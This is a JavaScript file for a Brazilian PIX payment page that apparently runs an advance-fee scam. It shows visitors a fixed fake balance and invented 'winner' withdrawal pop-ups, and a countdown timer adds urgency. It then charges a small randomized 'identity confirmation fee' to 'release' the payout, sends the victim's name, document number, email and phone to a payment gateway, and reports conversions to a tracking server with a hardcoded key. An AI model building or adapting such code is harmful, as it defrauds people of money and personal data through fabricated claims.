document.addEventListener("DOMContentLoaded", () => {
    // ===== Railway (Purchase garantido S2S) =====
    // Enquanto você não tiver Railway, deixe vazio que não faz nada.
    const RAILWAY_URL = "https://pix-purchase-railway-zuckpay-production.up.railway.app";       // ex: "https://seuapp.up.railway.app"
    const RAILWAY_API_KEY = "9aHgnfPRYaNx6QcBh3DFn05PiWP6t5WQ23";   // ex: "minha-chave-forte"

    function registrarPixNaRailway({ transactionId, pixCode, value }) {
        try {
            // Railway ainda não configurada? não faz nada.
            if (!RAILWAY_URL || !RAILWAY_API_KEY) return;

            const clickid = (localStorage.getItem('click_id') || localStorage.getItem('clickid') || '').trim();
            if (!clickid || !transactionId) return;

            const payload = {
                transactionId: String(transactionId),
                clickid: String(clickid),
                value: Number(value) || 0,
                currency: "BRL",
                pixCode: pixCode || null // opcional
            };

            fetch(`${RAILWAY_URL}/pix-created`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "x-api-key": RAILWAY_API_KEY
                },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(() => { });
        } catch (e) {
            // silencioso de propósito
        }
    }

    // --- 1. SELETORES DE ELEMENTOS ---
    const loadingScreen = document.getElementById('loading-screen');
    const loadingBarFill = document.getElementById('loading-bar-fill');
    const mainContent = document.getElementById('main-content');
    const btnGerarPix = document.getElementById('btn-gerar-pix');

    // Seletores do Modal
    const modalPix = document.getElementById('modal-pix');
    const qrCodeImg = document.getElementById('qr-code-img');
    const inputPixCode = document.getElementById('pix-copia-cola');
    const expiraTimer = document.getElementById('expira-timer');

    let intervaloGanhadores = null;

    const listaGanhadores = [
        { nome: "Pedro H.", valor: "R$ 2.029,02", img: "https://i.pravatar.cc/150?img=11" },
        { nome: "Maria S.", valor: "R$ 1.733,92", img: "https://i.pravatar.cc/150?img=5" },
        { nome: "João P.", valor: "R$ 5.496,72", img: "https://i.pravatar.cc/150?img=12" },
        { nome: "Ana C.", valor: "R$ 850,50", img: "https://i.pravatar.cc/150?img=9" },
        { nome: "Lucas M.", valor: "R$ 3.120,00", img: "https://i.pravatar.cc/150?img=15" },
        { nome: "Juliana T.", valor: "R$ 1.050,00", img: "https://i.pravatar.cc/150?img=20" }
    ];

    function mostrarGanhador() {
        const toast = document.getElementById('toast-saque');
        const toastImg = document.getElementById('toast-img');
        const toastMensagem = document.getElementById('toast-mensagem');
        if (!toast) return;

        const ganhador = listaGanhadores[Math.floor(Math.random() * listaGanhadores.length)];
        toastImg.src = ganhador.img;
        toastMensagem.innerHTML = `${ganhador.nome} sacou <strong class="texto-verde">${ganhador.valor}</strong>`;

        toast.classList.add('show');
        setTimeout(() => { toast.classList.remove('show'); }, 3000);
    }

    // --- 2. LÓGICA DO LOADING INICIAL ---
    const tempoLoading = 3000;
    let progresso = 0;
    const intervalo = setInterval(() => {
        progresso += (100 / (tempoLoading / 30));
        if (progresso >= 100) {
            progresso = 100;
            clearInterval(intervalo);
            setTimeout(() => {
                if (loadingScreen) {
                    loadingScreen.style.opacity = "0";
                    setTimeout(() => {
                        loadingScreen.style.display = "none";
                        mainContent.style.display = "block";
                        setTimeout(() => { mainContent.style.opacity = "1"; }, 50);
                    }, 500);
                }
            }, 300);
        }
        if (loadingBarFill) loadingBarFill.style.width = `${progresso}%`;
    }, 30);

    // --- 3. FUNÇÃO DO CRONÔMETRO ---
    function iniciarCronometro(duracao, display) {
        if (!display) return;
        let timer = duracao, minutos, segundos;
        const contagem = setInterval(() => {
            minutos = parseInt(timer / 60, 10);
            segundos = parseInt(timer % 60, 10);
            display.textContent = (minutos < 10 ? "0" + minutos : minutos) + ":" + (segundos < 10 ? "0" + segundos : segundos);
            if (--timer < 0) clearInterval(contagem);
        }, 1000);
    }

    // --- 4. CONFIGURAÇÃO DE VALORES DINÂMICOS ---
    function configurarValoresDinamicos() {
        const taxa = (Math.random() * (34 - 32) + 32).toFixed(2);
        const saldoOriginal = 5496.72;
        const totalReceber = (parseFloat(taxa) + saldoOriginal).toFixed(2);
        const formatar = (v) => parseFloat(v).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });

        const displayTaxa = document.getElementById('taxa-valor-display');
        if (displayTaxa) displayTaxa.innerText = formatar(taxa);

        document.querySelectorAll('.taxa-texto-dinamico').forEach(el => el.innerText = formatar(taxa));

        const displayTotal = document.getElementById('total-receber');
        if (displayTotal) displayTotal.innerText = formatar(totalReceber);

        const displayData = document.getElementById('data-atual');
        if (displayData) displayData.innerText = new Date().toLocaleDateString('pt-BR');
    }

    function carregarDadosUsuario() {
        const dados = JSON.parse(localStorage.getItem('dadosSaquePix')) || {};
        const nomeEl = document.getElementById('confirm-nome');
        const tipoEl = document.getElementById('confirm-tipo');
        const chaveEl = document.getElementById('confirm-chave');

        if (nomeEl) nomeEl.innerText = dados.nomeCompleto || "Não informado";
        if (tipoEl) tipoEl.innerText = dados.tipoChave || "PIX";
        if (chaveEl) chaveEl.innerText = dados.chavePix || "---";
    }

    // --- 6. AÇÃO DE GERAR PAGAMENTO ---
    const DUTTYFY_URL = 'https://www.pagamentos-seguros.app/api-pix/DsPjyrkANzHpZAOZ8AlEqAo7KYuIxhM7nEoWu6Ld0psP7F3UyuNSRuEJ3ELAy6j-BY7kkPKaf3jKYM7Sk_WPvA';

    if (btnGerarPix) {
        btnGerarPix.addEventListener('click', function() {
            btnGerarPix.innerHTML = "<i class='bx bx-loader-alt bx-spin'></i> Gerando PIX...";
            btnGerarPix.style.pointerEvents = "none";

            var taxaEl = document.getElementById('taxa-valor-display');
            var taxaTexto = taxaEl ? taxaEl.innerText : 'R$ 33,00';
            var valorLimpo = parseFloat(taxaTexto.replace(/[^\d,]/g, '').replace(',', '.'));
            var amountCents = Math.round(valorLimpo * 100);

            var urlParams = new URLSearchParams(window.location.search);
            var dadosSalvos = JSON.parse(localStorage.getItem('dadosSaquePix')) || {};

            var customerName = urlParams.get('name') || dadosSalvos.nomeCompleto || 'Ricardo Moreira';
            var customerDocument = (urlParams.get('document') || dadosSalvos.chavePix || '76838727765').replace(/\D/g, '');
            var customerEmail = urlParams.get('email') || dadosSalvos.email || 'ricardo.moreira8@live.com';
            var customerPhone = (urlParams.get('phone') || dadosSalvos.telefone || '9990790242').replace(/\D/g, '');

            var payload = {
                amount: amountCents,
                customer: {
                    name: customerName,
                    document: customerDocument,
                    email: customerEmail,
                    phone: customerPhone
                },
                item: {
                    title: 'Taxa de confirmação de identidade',
                    price: amountCents,
                    quantity: 1
                },
                paymentMethod: 'PIX',
                utm: window.location.search.replace(/^\?/, '')
            };

            fetch(DUTTYFY_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(function(res) {
                if (!res.ok) {
                    return res.text().then(function(text) {
                        throw new Error('API returned status ' + res.status + ' ' + res.statusText + ' - ' + text);
                    });
                }
                return res.json().catch(function(jsonErr) {
                    return res.text().then(function(txt) {
                        throw new Error('Resposta inválida (não JSON): ' + txt);
                    });
                });
            })
            .then(function(data) {
                // aceitar chaves alternativas que a API possa retornar
                var pixCode = (data && (data.pixCode || data.pix_code || data.pix_code_raw || data.code)) || null;
                var transactionId = (data && (data.transactionId || data.transaction_id || data.txId)) || null;

                if (!pixCode) {
                    throw new Error((data && (data.message || data.error)) || 'Erro ao gerar PIX: resposta sem código');
                }

                if (inputPixCode) inputPixCode.value = pixCode;

                if (qrCodeImg) {
                    qrCodeImg.src = 'https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=' + encodeURIComponent(pixCode);
                }

                registrarPixNaRailway({
                    transactionId: transactionId,
                    pixCode: pixCode,
                    value: valorLimpo
                });

                if (modalPix) {
                    modalPix.style.display = 'flex';
                    setTimeout(function() { modalPix.style.opacity = '1'; }, 10);
                    document.body.style.overflow = "hidden";

                    if (!intervaloGanhadores) {
                        setTimeout(mostrarGanhador, 1000);
                        intervaloGanhadores = setInterval(mostrarGanhador, 5000);
                    }
                }

                iniciarCronometro(60 * 7, expiraTimer);

                if (transactionId) {
                    var verificarStatus = setInterval(function() {
                        fetch(DUTTYFY_URL + '?transactionId=' + encodeURIComponent(transactionId))
                            .then(function(r) {
                                if (!r.ok) return null;
                                return r.json().catch(function() { return null; });
                            })
                            .then(function(resStatus) {
                                if (resStatus && resStatus.status === 'COMPLETED') {
                                    clearInterval(verificarStatus);
                                    setTimeout(function() { window.location.href = '/up1'; }, 500);
                                }
                            })
                            .catch(function(err) { console.error('Erro na consulta de status:', err); });
                    }, 5000);

                    setTimeout(function() { clearInterval(verificarStatus); }, 15 * 60 * 1000);
                }

                btnGerarPix.innerHTML = "Pagar taxa para Liberar Saque";
                btnGerarPix.style.pointerEvents = "auto";
            })
            .catch(function(err) {
                console.error('Erro ao gerar PIX:', err);
                alert("Erro ao gerar PIX. " + (err && err.message ? err.message : "Tente novamente."));
                btnGerarPix.innerHTML = "Pagar taxa para Liberar Saque";
                btnGerarPix.style.pointerEvents = "auto";
            });
        });
    }

    // --- FUNÇÃO GLOBAL DE COPIAR PIX ---
    window.copiarPix = function () {
        if (!inputPixCode) return;
        inputPixCode.select();
        inputPixCode.setSelectionRange(0, 99999);
        try {
            document.execCommand("copy");
            alert("Código PIX copiado com sucesso!");
        } catch (err) {
            navigator.clipboard.writeText(inputPixCode.value);
            alert("Código PIX copiado!");
        }
    };

    configurarValoresDinamicos();
    carregarDadosUsuario();
});